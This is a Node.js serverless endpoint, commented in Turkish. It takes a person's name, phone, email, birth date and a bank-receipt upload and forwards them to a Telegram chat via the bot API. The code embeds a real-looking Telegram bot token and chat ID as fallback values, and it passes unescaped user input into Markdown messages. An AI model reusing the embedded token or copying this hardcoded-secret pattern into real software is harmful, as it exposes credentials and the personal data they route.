// api/send-dekont-notification.js

const axios = require('axios');
const FormData = require('form-data');

// Vercel ortam değişkenlerinden bilgileri okur, yoksa varsayılan değerleri kullan
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8074262861:AAEIhWsYk1YNUpxa1IsUpSKuqQlezmFBrIQ';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003220073247';

module.exports = async (req, res) => {
    // Sadece POST isteklerini işle
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    try {
        // Multipart form data kontrolü
        const isMultipart = req.headers['content-type'] && req.headers['content-type'].includes('multipart/form-data');
        
        let name, phone, email, birth_date, dekontFile;

        if (isMultipart) {
            // FormData'dan bilgileri al (Vercel'de req.body kullanılamaz, manual parse gerekir)
            // Bu durumda frontend'den JSON olarak göndermek daha kolay olacak
            return res.status(400).json({ 
                success: false, 
                message: 'Lütfen JSON formatında gönderin.' 
            });
        } else {
            // JSON formatında geliyorsa
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
            name = body.name;
            phone = body.phone;
            email = body.email;
            birth_date = body.birth_date;
            dekontFile = body.dekont_file; // Base64 encoded dosya veya URL
            
            // Body'yi daha sonra kullanmak için sakla
            req.body = body;
        }

        // Gerekli alanları kontrol et
        if (!name || !phone || !email) {
            return res.status(400).json({ 
                success: false, 
                message: 'Eksik bilgi: name, phone ve email zorunludur.' 
            });
        }

        // Doğum tarihini formatla (dd.mm.yyyy)
        let formattedBirthDate = '';
        if (birth_date) {
            // Eğer zaten dd.mm.yyyy formatındaysa olduğu gibi kullan
            if (birth_date.match(/^\d{2}\.\d{2}\.\d{4}$/)) {
                formattedBirthDate = birth_date;
            } else {
                // Diğer formatları parse et
                const parts = birth_date.split(/[\/\-\.]/);
                if (parts.length === 3) {
                    // Yıl, ay, gün formatından gün, ay, yıl formatına çevir
                    // Eğer ilk kısım 4 haneli ise yıl, değilse gün
                    if (parts[0].length === 4) {
                        // yyyy-mm-dd formatı
                        formattedBirthDate = `${parts[2]}.${parts[1]}.${parts[0]}`;
                    } else {
                        // dd-mm-yyyy veya dd/mm/yyyy formatı
                        formattedBirthDate = `${parts[0]}.${parts[1]}.${parts[2]}`;
                    }
                } else {
                    formattedBirthDate = birth_date;
                }
            }
        }

        // Telegram'a gönderilecek mesaj (yeni format)
        const messageText = `✅ Dekont Yüklendi\n\n👤 Ad Soyad: ${name}\n\n📱 Telefon: ${phone}\n\n📧 E-posta: ${email}\n\n📅 Doğum Tarihi: ${formattedBirthDate || 'Belirtilmemiş'}`;

        // Dekont dosyası varsa Telegram'a gönder
        if (dekontFile && req.body.dekont_filename) {
            try {
                // Base64'ten Buffer'a çevir
                const base64Data = dekontFile.replace(/^data:.*,/, '');
                const fileBuffer = Buffer.from(base64Data, 'base64');
                
                // FormData oluştur
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', messageText);
                formData.append('parse_mode', 'Markdown');
                
                // Dosya tipine göre endpoint seç
                const isImage = req.body.dekont_filetype && req.body.dekont_filetype.startsWith('image/');
                const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
                const fileField = isImage ? 'photo' : 'document';
                
                formData.append(fileField, fileBuffer, {
                    filename: req.body.dekont_filename,
                    contentType: req.body.dekont_filetype || 'application/octet-stream'
                });
                
                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
                
                await axios.post(telegramApiUrl, formData, {
                    headers: formData.getHeaders()
                });
            } catch (photoError) {
                console.error('Fotoğraf gönderme hatası:', photoError.message);
                // Fotoğraf gönderilemese bile mesajı gönder
                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await axios.post(telegramApiUrl, {
                    chat_id: CHAT_ID,
                    text: messageText,
                    parse_mode: 'Markdown',
                });
            }
        } else {
            // Dosya yoksa sadece mesaj gönder
            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await axios.post(telegramApiUrl, {
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown',
            });
        }

        // Başarılı yanıt
        return res.status(200).json({ 
            success: true, 
            message: 'Dekont bildirimi gönderildi.'
        });

    } catch (error) {
        console.error('Send Dekont Notification Error:', error.message);
        return res.status(500).json({ 
            success: false, 
            message: 'Bildirim gönderilemedi.',
            error: error.message
        });
    }
};

